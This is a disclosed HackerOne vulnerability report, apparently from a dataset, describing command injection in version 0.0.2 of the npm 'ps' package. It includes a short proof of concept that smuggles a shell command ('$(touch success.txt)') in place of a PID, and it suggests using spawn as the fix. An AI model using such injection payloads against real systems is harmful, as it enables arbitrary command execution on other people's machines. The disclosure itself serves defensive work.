---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '390848'
original_report_id: '390848'
title: Command Injection is ps Package
weakness: Command Injection - Generic
team_handle: nodejs-ecosystem
created_at: '2018-08-06T10:19:15.354Z'
disclosed_at: '2018-09-07T06:47:28.954Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 8
asset_identifier: ps
asset_type: SOURCE_CODE
max_severity: critical
tags:
- hackerone
- command-injection-generic
---

# Command Injection is ps Package

## Metadata

- HackerOne Report ID: 390848
- Weakness: Command Injection - Generic
- Program: nodejs-ecosystem
- Disclosed At: 2018-09-07T06:47:28.954Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

I would like to report a command injection in ps package.
It allows attacker to inject arbitrary OS commands instead of PID numbers.

# Module

**module name:** ps
**version:** 0.0.2
**npm page:** `https://www.npmjs.com/package/ps`

## Module Description

A Node.js module for looking up running processes.

## Module Stats

39 downloads in the last week

# Vulnerability

## Vulnerability Description

The ps package expects a valid PID number, but an attacker can inject arbitrary commands instead.

## Steps To Reproduce:
```js
var ps = require('ps');

ps.lookup({ pid: "$(touch success.txt)" }, function(err, proc) { // this method is vulnerable to command injection
    if (err) {throw err;}
    if (proc) {
        console.log(proc);  // Process name, something like "node" or "bash"
    } else {
        console.log('No such process');
    }
});
```

## Patch

N/A replace exec with spawn

# Wrap up

- I contacted the maintainer to let them know: N
- I opened an issue in the related repository: N

## Impact

If the attacker can control the PID, she can inject arbitrary OS commands.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
